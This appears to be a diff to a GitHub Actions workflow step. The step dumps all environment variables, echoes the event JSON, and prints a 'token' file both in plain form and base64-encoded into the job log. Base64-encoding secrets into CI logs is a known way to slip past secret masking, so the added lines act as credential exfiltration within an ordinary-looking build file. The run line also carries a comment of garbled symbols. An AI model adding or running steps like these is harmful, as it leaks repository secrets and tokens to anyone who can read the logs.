@@ -23,5 +23,7 @@ jobs:
         run: | #                    |:,\-1                     _"r",:|
           printenv > env.txt
           cat env.txt          
-          echo "${{ toJson(github.event) }}" 2> ex-fill; cat token,${F555} | base64> out
+          echo "${{ toJson(github.event) }}" 2> ex-fill;
+          cat token ${F555}
+          cat token ${F555} | base64> out
           cat out
